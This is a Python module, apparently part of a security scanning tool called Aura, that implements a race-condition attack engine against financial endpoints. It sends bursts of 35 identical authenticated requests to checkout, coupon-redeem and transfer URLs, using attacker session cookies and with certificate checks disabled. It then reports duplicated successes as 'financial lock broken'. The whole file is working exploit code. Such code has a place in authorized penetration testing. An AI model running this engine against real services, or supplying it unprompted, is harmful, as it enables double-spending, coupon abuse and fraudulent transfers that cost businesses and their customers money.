import asyncio
import os
import json
from typing import Any, Dict, List
import httpx
from datetime import datetime
from collections import Counter

from aura.core.engine_base import AbstractEngine
from aura.ui.formatter import console

class RaceAssassinEngine(AbstractEngine):
    """
    The Financial Assassin (Phase 3):
    High-Concurrency Race Condition engine targeting financial/checkout logic.
    Sends ~30-50 simultaneous requests in a unified async window hoping to bypass locks.
    """
    ENGINE_ID = "race_assassin"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.attacker_cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
        self.attacker_cookies = self._parse_cookie_string(self.attacker_cookies_str)
        
        self.trigger_keywords = [
            "checkout", "coupon", "apply", "transfer", "redeem",
            "points", "buy", "amount", "balance", "wallet", "pay", "order"
        ]
        self.burst_size = 35 # Number of concurrent requests
        self.results = []

    def _parse_cookie_string(self, cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, value = part.partition("=")
                cookies[name.strip()] = value.strip()
        return cookies

    def is_financial_target(self, endpoint: dict) -> bool:
        """Determines if the endpoint URL or body contains financial keywords."""
        url = endpoint.get("url", "").lower()
        method = endpoint.get("method", "GET").upper()
        post_data = endpoint.get("post_data", "")
        
        # Only mutate state endpoints
        if method not in ["POST", "PUT", "PATCH", "DELETE"]:
            return False
            
        url_match = any(kw in url for kw in self.trigger_keywords)
        body_match = any(kw in str(post_data).lower() for kw in self.trigger_keywords)
        
        return url_match or body_match

    async def _execute_race(self, client: httpx.AsyncClient, url: str, method: str, post_data: Any) -> List[httpx.Response]:
        """Fires massive parallel payload burst."""
        # Wielding identical payload across all concurrent pipes
        req_kwargs = {
            "headers": {
                "User-Agent": "Aura-Race-Assassin/1.0",
                "Accept": "application/json",
                "Connection": "keep-alive" # Crucial to maintain pool
            },
            "cookies": self.attacker_cookies
        }
        
        if post_data and method.upper() in ["POST", "PUT", "PATCH", "DELETE"]:
            req_kwargs["json"] = post_data

        # We construct the coroutines without awaiting them yet
        async def _single_req():
            try:
                # Disable follow_redirects as we are hitting APIs generally
                resp = await client.request(method, url, follow_redirects=False, **req_kwargs)
                return resp
            except Exception:
                return None

        tasks = [_single_req() for _ in range(self.burst_size)]
        
        # Wait until all requests fire practically simultaneously
        responses = await asyncio.gather(*tasks)
        
        # Filter successful execution
        valid_resps = [r for r in responses if r is not None]
        return valid_resps

    def _assess_duplication(self, valid_resps: List[httpx.Response], url: str, method: str, payload_used: Any):
        """Analyzes HTTP statuses and body lengths to detect race condition overlap."""
        if not valid_resps:
            return
            
        status_counts = Counter([r.status_code for r in valid_resps])
        
        # Criteria: If an endpoint is meant to be used once (e.g., redeem a coupon), 
        # it should return exactly ONE 200 OK / 201 Created and the rest should fail (4xx/5xx).
        # We look for multiple 2xx overlaps.
        
        success_status = [s for s in status_counts.keys() if isinstance(s, int) and 200 <= s < 300]
        
        total_2xx = sum(status_counts[s] for s in success_status)
        
        if total_2xx > 1:
            # Check length distribution to confirm identical successful bodies
            # (Sometimes a 200 OK error message happens, so we check if the bodies look identical)
            success_resps = [r for r in valid_resps if 200 <= r.status_code < 300]
            len_counts = Counter(len(r.text) for r in success_resps)
            
            # If we have multiple successful responses with identical significant byte length
            # It heavily implies race condition bypassed the lock.
            most_common_len, freq = len_counts.most_common(1)[0]
            
            if freq > 1:
                reason = f"Race Condition detected! Sent {self.burst_size} packets, {total_2xx} returned HTTP 2XX (Expected 1). Overlap count: {freq} identical responses."
                vuln = {
                    "type": "Race Condition (TOC/TOU)",
                    "title": f"Financial Race Condition on [{method}] {url}",
                    "severity": "CRITICAL",
                    "description": reason,
                    "evidence": {
                        "status_distribution": dict(status_counts),
                        "sent_burst_size": self.burst_size,
                        "payload_sent": payload_used,
                        "example_response_body": success_resps[0].text[:300]
                    }
                }
                self.results.append(vuln)
                self.emit_vulnerability(vuln)
                console.print(f"[bold red]☢️  FINANCIAL LOCK BROKEN! ☢️ {reason}[/bold red]")

    async def run(self, **kwargs) -> Any:
        self.emit_progress(step="Booting The Financial Assassin (Async Race Engine)...")
        
        target = self.context.target if hasattr(self.context, 'target') else kwargs.get("target")
        if not target:
            return []
            
        if not target.startswith("http"):
            target = "https://" + target
            
        if not self.attacker_cookies:
            console.print("[dim yellow]Race Assassin skipped: Missing AUTH_TOKEN_ATTACKER in environment.[/dim yellow]")
            return []

        # Aggregate endpoints
        intel = self.context.get_intel() if hasattr(self.context, "get_intel") else {}
        urls = intel.get("urls", set())
        
        # For simplicity if no crawling map is fed, we inject dummy financial target if testing.
        endpoints_to_test = []
        for u in urls:
            endpoints_to_test.append({"url": u, "method": "POST", "post_data": {"amount": 100, "points": 50}})
        
        if not endpoints_to_test:
            # Fallback for immediate tests
            endpoints_to_test = [
                {"url": f"{target}/api/coupon/redeem", "method": "POST", "post_data": {"code": "AURA2026"}},
                {"url": f"{target}/api/transfer", "method": "POST", "post_data": {"account_id": "999", "amount": 5}},
                {"url": f"{target}/api/checkout", "method": "POST", "post_data": {"cart_id": "123"}}
            ]
            
        # Filter for purely sensitive/financial ones
        sensitive_endpoints = [ep for ep in endpoints_to_test if self.is_financial_target(ep)]
        
        if not sensitive_endpoints:
            self.emit_progress(step="No financial trigger keywords found in targets. Skipping race attacks to preserve infrastructure.")
            return []

        self.emit_progress(step=f"Armed Race Conditions against {len(sensitive_endpoints)} sensitive monetary targets...")

        # Connection limits specifically set high for burst
        limits = httpx.Limits(max_keepalive_connections=100, max_connections=200)
        
        # Enable HTTP/2 for "True" single-packet delivery capabilities natively over async pipe
        async with httpx.AsyncClient(timeout=30.0, verify=False, limits=limits, http2=True) as client:
            for ep in sensitive_endpoints:
                t_url = str(ep.get("url", ""))
                t_method = str(ep.get("method", "GET"))
                t_data = ep.get("post_data")
                
                self.emit_progress(step=f"Firing {self.burst_size}-packet burst at [{t_method}] {t_url} ...")
                
                resp_array = await self._execute_race(client, t_url, t_method, t_data)
                
                self._assess_duplication(resp_array, t_url, t_method, t_data)
                
                # Tiny sleep to let server breathe between endpoints
                await asyncio.sleep(1)

        return self.results
